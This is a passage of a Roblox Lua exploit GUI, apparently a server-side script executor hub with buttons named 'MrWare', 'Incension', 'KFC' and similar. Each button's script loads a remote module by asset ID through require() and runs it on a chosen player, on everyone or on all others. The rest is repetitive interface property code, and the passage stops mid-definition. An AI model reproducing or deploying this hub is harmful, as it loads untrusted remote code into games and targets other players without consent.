ImageLabel121.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel121.ScaleType = Enum.ScaleType.Slice
ImageLabel121.SliceCenter = 100, 100, 100, 100
TextButton122.Name = "Admin"
TextButton122.Parent = ScrollingFrame100
TextButton122.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -988)
TextButton122.Size = UDim2.new(0, 271, 0, 21)
TextButton122.BackgroundColor = BrickColor.new("Really black")
TextButton122.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton122.BackgroundTransparency = 1
TextButton122.BorderColor = BrickColor.new("Really black")
TextButton122.BorderColor3 = Color3.new(0, 0, 0)
TextButton122.ZIndex = 7
TextButton122.Font = Enum.Font.SourceSansSemibold
TextButton122.FontSize = Enum.FontSize.Size14
TextButton122.Text = "MrWare"
TextButton122.TextColor = BrickColor.new("Institutional white")
TextButton122.TextColor3 = Color3.new(1, 1, 1)
TextButton122.TextSize = 14
TextButton122.TextWrap = true
TextButton122.TextWrapped = true
TextButton122.TextXAlignment = Enum.TextXAlignment.Left
Script123.Parent = TextButton122
table.insert(cors,sandbox(Script123,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4612678818).wareman(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4612678818).wareman(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4612678818).wareman(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4612678818).wareman(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel124.Name = "Vertical"
ImageLabel124.Parent = TextButton122
ImageLabel124.Position = UDim2.new(0, -2, 0, 0)
ImageLabel124.Size = UDim2.new(1, 3, 1, 0)
ImageLabel124.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel124.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel124.BackgroundTransparency = 1
ImageLabel124.ZIndex = 3
ImageLabel124.Image = "rbxassetid://3570695787"
ImageLabel124.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel124.ScaleType = Enum.ScaleType.Slice
ImageLabel124.SliceCenter = 100, 100, 100, 100
TextButton125.Name = "Admin"
TextButton125.Parent = ScrollingFrame100
TextButton125.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -964)
TextButton125.Size = UDim2.new(0, 271, 0, 21)
TextButton125.BackgroundColor = BrickColor.new("Really black")
TextButton125.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton125.BackgroundTransparency = 1
TextButton125.BorderColor = BrickColor.new("Really black")
TextButton125.BorderColor3 = Color3.new(0, 0, 0)
TextButton125.ZIndex = 7
TextButton125.Font = Enum.Font.SourceSansSemibold
TextButton125.FontSize = Enum.FontSize.Size14
TextButton125.Text = "Incension"
TextButton125.TextColor = BrickColor.new("Institutional white")
TextButton125.TextColor3 = Color3.new(1, 1, 1)
TextButton125.TextSize = 14
TextButton125.TextWrap = true
TextButton125.TextWrapped = true
TextButton125.TextXAlignment = Enum.TextXAlignment.Left
Script126.Parent = TextButton125
table.insert(cors,sandbox(Script126,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4612693754).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4612693754).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4612693754).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4612693754).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel127.Name = "Vertical"
ImageLabel127.Parent = TextButton125
ImageLabel127.Position = UDim2.new(0, -2, 0, 0)
ImageLabel127.Size = UDim2.new(1, 3, 1, 0)
ImageLabel127.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel127.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel127.BackgroundTransparency = 1
ImageLabel127.ZIndex = 3
ImageLabel127.Image = "rbxassetid://3570695787"
ImageLabel127.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel127.ScaleType = Enum.ScaleType.Slice
ImageLabel127.SliceCenter = 100, 100, 100, 100
TextButton128.Name = "Admin"
TextButton128.Parent = ScrollingFrame100
TextButton128.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -916)
TextButton128.Size = UDim2.new(0, 271, 0, 21)
TextButton128.BackgroundColor = BrickColor.new("Really black")
TextButton128.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton128.BackgroundTransparency = 1
TextButton128.BorderColor = BrickColor.new("Really black")
TextButton128.BorderColor3 = Color3.new(0, 0, 0)
TextButton128.ZIndex = 7
TextButton128.Font = Enum.Font.SourceSansSemibold
TextButton128.FontSize = Enum.FontSize.Size14
TextButton128.Text = "Baseplate"
TextButton128.TextColor = BrickColor.new("Institutional white")
TextButton128.TextColor3 = Color3.new(1, 1, 1)
TextButton128.TextSize = 14
TextButton128.TextWrap = true
TextButton128.TextWrapped = true
TextButton128.TextXAlignment = Enum.TextXAlignment.Left
Script129.Parent = TextButton128
table.insert(cors,sandbox(Script129,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4648776586).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4648776586).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4648776586).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4648776586).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel130.Name = "Vertical"
ImageLabel130.Parent = TextButton128
ImageLabel130.Position = UDim2.new(0, -2, 0, 0)
ImageLabel130.Size = UDim2.new(1, 3, 1, 0)
ImageLabel130.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel130.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel130.BackgroundTransparency = 1
ImageLabel130.ZIndex = 3
ImageLabel130.Image = "rbxassetid://3570695787"
ImageLabel130.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel130.ScaleType = Enum.ScaleType.Slice
ImageLabel130.SliceCenter = 100, 100, 100, 100
TextButton131.Name = "Admin"
TextButton131.Parent = ScrollingFrame100
TextButton131.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -892)
TextButton131.Size = UDim2.new(0, 271, 0, 21)
TextButton131.BackgroundColor = BrickColor.new("Really black")
TextButton131.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton131.BackgroundTransparency = 1
TextButton131.BorderColor = BrickColor.new("Really black")
TextButton131.BorderColor3 = Color3.new(0, 0, 0)
TextButton131.ZIndex = 7
TextButton131.Font = Enum.Font.SourceSansSemibold
TextButton131.FontSize = Enum.FontSize.Size14
TextButton131.Text = "Castle Lobby"
TextButton131.TextColor = BrickColor.new("Institutional white")
TextButton131.TextColor3 = Color3.new(1, 1, 1)
TextButton131.TextSize = 14
TextButton131.TextWrap = true
TextButton131.TextWrapped = true
TextButton131.TextXAlignment = Enum.TextXAlignment.Left
Script132.Parent = TextButton131
table.insert(cors,sandbox(Script132,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4648844677).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4648844677).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4648844677).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4648844677).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel133.Name = "Vertical"
ImageLabel133.Parent = TextButton131
ImageLabel133.Position = UDim2.new(0, -2, 0, 0)
ImageLabel133.Size = UDim2.new(1, 3, 1, 0)
ImageLabel133.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel133.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel133.BackgroundTransparency = 1
ImageLabel133.ZIndex = 3
ImageLabel133.Image = "rbxassetid://3570695787"
ImageLabel133.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel133.ScaleType = Enum.ScaleType.Slice
ImageLabel133.SliceCenter = 100, 100, 100, 100
TextButton134.Name = "Admin"
TextButton134.Parent = ScrollingFrame100
TextButton134.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -868)
TextButton134.Size = UDim2.new(0, 271, 0, 21)
TextButton134.BackgroundColor = BrickColor.new("Really black")
TextButton134.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton134.BackgroundTransparency = 1
TextButton134.BorderColor = BrickColor.new("Really black")
TextButton134.BorderColor3 = Color3.new(0, 0, 0)
TextButton134.ZIndex = 7
TextButton134.Font = Enum.Font.SourceSansSemibold
TextButton134.FontSize = Enum.FontSize.Size14
TextButton134.Text = "Crossroads"
TextButton134.TextColor = BrickColor.new("Institutional white")
TextButton134.TextColor3 = Color3.new(1, 1, 1)
TextButton134.TextSize = 14
TextButton134.TextWrap = true
TextButton134.TextWrapped = true
TextButton134.TextXAlignment = Enum.TextXAlignment.Left
Script135.Parent = TextButton134
table.insert(cors,sandbox(Script135,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4612864617).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4612864617).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4612864617).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4612864617).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel136.Name = "Vertical"
ImageLabel136.Parent = TextButton134
ImageLabel136.Position = UDim2.new(0, -2, 0, 0)
ImageLabel136.Size = UDim2.new(1, 3, 1, 0)
ImageLabel136.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel136.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel136.BackgroundTransparency = 1
ImageLabel136.ZIndex = 3
ImageLabel136.Image = "rbxassetid://3570695787"
ImageLabel136.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel136.ScaleType = Enum.ScaleType.Slice
ImageLabel136.SliceCenter = 100, 100, 100, 100
TextButton137.Name = "Admin"
TextButton137.Parent = ScrollingFrame100
TextButton137.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -844)
TextButton137.Size = UDim2.new(0, 271, 0, 21)
TextButton137.BackgroundColor = BrickColor.new("Really black")
TextButton137.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton137.BackgroundTransparency = 1
TextButton137.BorderColor = BrickColor.new("Really black")
TextButton137.BorderColor3 = Color3.new(0, 0, 0)
TextButton137.ZIndex = 7
TextButton137.Font = Enum.Font.SourceSansSemibold
TextButton137.FontSize = Enum.FontSize.Size14
TextButton137.Text = "KFC"
TextButton137.TextColor = BrickColor.new("Institutional white")
TextButton137.TextColor3 = Color3.new(1, 1, 1)
TextButton137.TextSize = 14
TextButton137.TextWrap = true
TextButton137.TextWrapped = true
TextButton137.TextXAlignment = Enum.TextXAlignment.Left
Script138.Parent = TextButton137
table.insert(cors,sandbox(Script138,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4658697892).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4658697892).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4658697892).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4658697892).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel139.Name = "Vertical"
ImageLabel139.Parent = TextButton137
ImageLabel139.Position = UDim2.new(0, -2, 0, 0)
ImageLabel139.Size = UDim2.new(1, 3, 1, 0)
ImageLabel139.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel139.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel139.BackgroundTransparency = 1
ImageLabel139.ZIndex = 3
ImageLabel139.Image = "rbxassetid://3570695787"
ImageLabel139.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel139.ScaleType = Enum.ScaleType.Slice
ImageLabel139.SliceCenter = 100, 100, 100, 100
TextButton140.Name = "Admin"
TextButton140.Parent = ScrollingFrame100
TextButton140.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -796)
TextButton140.Size = UDim2.new(0, 271, 0, 21)
TextButton140.BackgroundColor = BrickColor.new("Really black")
TextButton140.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton140.BackgroundTransparency = 1
TextButton140.BorderColor = BrickColor.new("Really black")
TextButton140.BorderColor3 = Color3.new(0, 0, 0)
TextButton140.ZIndex = 7
TextButton140.Font = Enum.Font.SourceSansSemibold
TextButton140.FontSize = Enum.FontSize.Size14
TextButton140.Text = "SuperMarioCastle"
TextButton140.TextColor = BrickColor.new("Institutional white")
TextButton140.TextColor3 = Color3.new(1, 1, 1)
TextButton140.TextSize = 14
TextButton140.TextWrap = true
TextButton140.TextWrapped = true
TextButton140.TextXAlignment = Enum.TextXAlignment.Left
Script141.Parent = TextButton140
table.insert(cors,sandbox(Script141,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4658790266).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4658790266).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4658790266).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4658790266).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel142.Name = "Vertical"
ImageLabel142.Parent = TextButton140
ImageLabel142.Position = UDim2.new(0, -2, 0, 0)
ImageLabel142.Size = UDim2.new(1, 3, 1, 0)
ImageLabel142.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel142.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel142.BackgroundTransparency = 1
ImageLabel142.ZIndex = 3
ImageLabel142.Image = "rbxassetid://3570695787"
ImageLabel142.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel142.ScaleType = Enum.ScaleType.Slice
ImageLabel142.SliceCenter = 100, 100, 100, 100
TextButton143.Name = "Admin"
TextButton143.Parent = ScrollingFrame100
TextButton143.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -772)
TextButton143.Size = UDim2.new(0, 271, 0, 21)
TextButton143.BackgroundColor = BrickColor.new("Really black")
TextButton143.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton143.BackgroundTransparency = 1
TextButton143.BorderColor = BrickColor.new("Really black")
TextButton143.BorderColor3 = Color3.new(0, 0, 0)
TextButton143.ZIndex = 7
TextButton143.Font = Enum.Font.SourceSansSemibold
TextButton143.FontSize = Enum.FontSize.Size14
TextButton143.Text = "Target"
TextButton143.TextColor = BrickColor.new("Institutional white")
TextButton143.TextColor3 = Color3.new(1, 1, 1)
TextButton143.TextSize = 14
TextButton143.TextWrap = true
TextButton143.TextWrapped = true
TextButton143.TextXAlignment = Enum.TextXAlignment.Left
Script144.Parent = TextButton143
table.insert(cors,sandbox(Script144,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4658864015).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4658864015).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4658864015).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4658864015).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel145.Name = "Vertical"
ImageLabel145.Parent = TextButton143
ImageLabel145.Position = UDim2.new(0, -2, 0, 0)
ImageLabel145.Size = UDim2.new(1, 3, 1, 0)
ImageLabel145.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel145.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel145.BackgroundTransparency = 1
ImageLabel145.ZIndex = 3
ImageLabel145.Image = "rbxassetid://3570695787"
ImageLabel145.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel145.ScaleType = Enum.ScaleType.Slice
ImageLabel145.SliceCenter = 100, 100, 100, 100
TextButton146.Name = "Admin"
TextButton146.Parent = ScrollingFrame100
TextButton146.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -940)
TextButton146.Size = UDim2.new(0, 271, 0, 21)
TextButton146.BackgroundColor = BrickColor.new("Really black")
TextButton146.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton146.BackgroundTransparency = 1
TextButton146.BorderColor = BrickColor.new("Really black")
TextButton146.BorderColor3 = Color3.new(0, 0, 0)
TextButton146.ZIndex = 7
TextButton146.Font = Enum.Font.SourceSansSemibold
TextButton146.FontSize = Enum.FontSize.Size14
TextButton146.Text = "Influx"
TextButton146.TextColor = BrickColor.new("Institutional white")
TextButton146.TextColor3 = Color3.new(1, 1, 1)
TextButton146.TextSize = 14
TextButton146.TextWrap = true
TextButton146.TextWrapped = true
TextButton146.TextXAlignment = Enum.TextXAlignment.Left
Script147.Parent = TextButton146
table.insert(cors,sandbox(Script147,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4659946637).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4659946637).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4659946637).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4659946637).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel148.Name = "Vertical"
ImageLabel148.Parent = TextButton146
ImageLabel148.Position = UDim2.new(0, -2, 0, 0)
ImageLabel148.Size = UDim2.new(1, 3, 1, 0)
ImageLabel148.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel148.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel148.BackgroundTransparency = 1
ImageLabel148.ZIndex = 3
ImageLabel148.Image = "rbxassetid://3570695787"
ImageLabel148.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel148.ScaleType = Enum.ScaleType.Slice
ImageLabel148.SliceCenter = 100, 100, 100, 100
TextButton149.Name = "Admin"
TextButton149.Parent = ScrollingFrame100
TextButton149.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -820)
TextButton149.Size = UDim2.new(0, 271, 0, 21)
TextButton149.BackgroundColor = BrickColor.new("Really black")
TextButton149.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton149.BackgroundTransparency = 1
TextButton149.BorderColor = BrickColor.new("Really black")
TextButton149.BorderColor3 = Color3.new(0, 0, 0)
TextButton149.ZIndex = 7
TextButton149.Font = Enum.Font.SourceSansSemibold
TextButton149.FontSize = Enum.FontSize.Size14
TextButton149.Text = "Ender"
TextButton149.TextColor = BrickColor.new("Institutional white")
TextButton149.TextColor3 = Color3.new(1, 1, 1)
TextButton149.TextSize = 14
TextButton149.TextWrap = true
TextButton149.TextWrapped = true
TextButton149.TextXAlignment = Enum.TextXAlignment.Left
Script150.Parent = TextButton149
table.insert(cors,sandbox(Script150,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4659999835).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4659999835).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4659999835).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4659999835).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel151.Name = "Vertical"
ImageLabel151.Parent = TextButton149
ImageLabel151.Position = UDim2.new(0, -2, 0, 0)
ImageLabel151.Size = UDim2.new(1, 3, 1, 0)
ImageLabel151.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel151.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel151.BackgroundTransparency = 1
ImageLabel151.ZIndex = 3
ImageLabel151.Image = "rbxassetid://3570695787"
ImageLabel151.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel151.ScaleType = Enum.ScaleType.Slice
ImageLabel151.SliceCenter = 100, 100, 100, 100
TextButton152.Name = "Admin"
TextButton152.Parent = ScrollingFrame100
TextButton152.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -748)
TextButton152.Size = UDim2.new(0, 271, 0, 21)
TextButton152.BackgroundColor = BrickColor.new("Really black")
TextButton152.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton152.BackgroundTransparency = 1
TextButton152.BorderColor = BrickColor.new("Really black")
TextButton152.BorderColor3 = Color3.new(0, 0, 0)
TextButton152.ZIndex = 7
TextButton152.Font = Enum.Font.SourceSansSemibold
TextButton152.FontSize = Enum.FontSize.Size14
TextButton152.Text = "Abyss Eye"
TextButton152.TextColor = BrickColor.new("Institutional white")
TextButton152.TextColor3 = Color3.new(1, 1, 1)
TextButton152.TextSize = 14
TextButton152.TextWrap = true
TextButton152.TextWrapped = true
TextButton152.TextXAlignment = Enum.TextXAlignment.Left
Script153.Parent = TextButton152
table.insert(cors,sandbox(Script153,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4660041997).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4660041997).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4660041997).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4660041997).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel154.Name = "Vertical"
ImageLabel154.Parent = TextButton152
ImageLabel154.Position = UDim2.new(0, -2, 0, 0)
ImageLabel154.Size = UDim2.new(1, 3, 1, 0)
ImageLabel154.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel154.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel154.BackgroundTransparency = 1
ImageLabel154.ZIndex = 3
ImageLabel154.Image = "rbxassetid://3570695787"
ImageLabel154.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel154.ScaleType = Enum.ScaleType.Slice
ImageLabel154.SliceCenter = 100, 100, 100, 100
TextButton155.Name = "Admin"
TextButton155.Parent = ScrollingFrame100
TextButton155.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -724)
TextButton155.Size = UDim2.new(0, 271, 0, 21)
TextButton155.BackgroundColor = BrickColor.new("Really black")
TextButton155.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton155.BackgroundTransparency = 1
TextButton155.BorderColor = BrickColor.new("Really black")
TextButton155.BorderColor3 = Color3.new(0, 0, 0)
TextButton155.ZIndex = 7
TextButton155.Font = Enum.Font.SourceSansSemibold
TextButton155.FontSize = Enum.FontSize.Size14
TextButton155.Text = "Holy Wrench"
TextButton155.TextColor = BrickColor.new("Institutional white")
TextButton155.TextColor3 = Color3.new(1, 1, 1)
TextButton155.TextSize = 14
TextButton155.TextWrap = true
TextButton155.TextWrapped = true
TextButton155.TextXAlignment = Enum.TextXAlignment.Left
Script156.Parent = TextButton155
table.insert(cors,sandbox(Script156,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4649192966).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4649192966).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4649192966).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4649192966).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel157.Name = "Vertical"
ImageLabel157.Parent = TextButton155
ImageLabel157.Position = UDim2.new(0, -2, 0, 0)
ImageLabel157.Size = UDim2.new(1, 3, 1, 0)
ImageLabel157.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel157.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel157.BackgroundTransparency = 1
ImageLabel157.ZIndex = 3
ImageLabel157.Image = "rbxassetid://3570695787"
ImageLabel157.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel157.ScaleType = Enum.ScaleType.Slice
ImageLabel157.SliceCenter = 100, 100, 100, 100
TextButton158.Name = "Admin"
TextButton158.Parent = ScrollingFrame100
TextButton158.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -700)
